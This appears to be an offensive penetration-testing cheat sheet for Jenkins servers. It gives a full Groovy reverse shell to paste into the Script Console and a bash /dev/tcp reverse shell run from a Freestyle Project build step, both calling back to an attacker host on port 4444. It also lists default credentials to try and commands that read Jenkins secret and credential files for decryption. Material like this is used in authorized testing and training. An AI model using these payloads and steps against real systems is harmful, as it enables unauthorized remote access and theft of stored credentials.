# Jenkins

### Access Jenkins Script Console

/script endpoint allows Groovy execution — Instant RCE if accessible

```bash
# Check if accessible (no auth or with found creds)
curl http://$IP:8080/script
```

---

### Groovy reverse shell

Execute via Script Console — Full system shell

```bash
# Paste in /script console:
String host="$LHOST";int port=4444;String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

---

### Jenkins default credentials

Common defaults to try — Often left unchanged

```bash
# Default creds:
# admin:admin
# admin:password
# jenkins:jenkins
# Check for signup enabled: http://$IP:8080/signup
```

---

### Read credentials from Jenkins

Decrypt stored secrets — Jenkins stores creds in XML files

```bash
# If you have filesystem access:
cat /var/lib/jenkins/credentials.xml
cat /var/lib/jenkins/secrets/master.key
cat /var/lib/jenkins/secrets/hudson.util.Secret
# Use jenkins-decrypt tools to recover plaintext passwords
```

---

### Create a Freestyle Project for RCE

Build step with shell command — Works with any Jenkins access

```bash
# New Item → Freestyle Project → Build → Execute shell
# Enter: bash -i >& /dev/tcp/$LHOST/4444 0>&1
# Click Build Now → catch shell
```

---
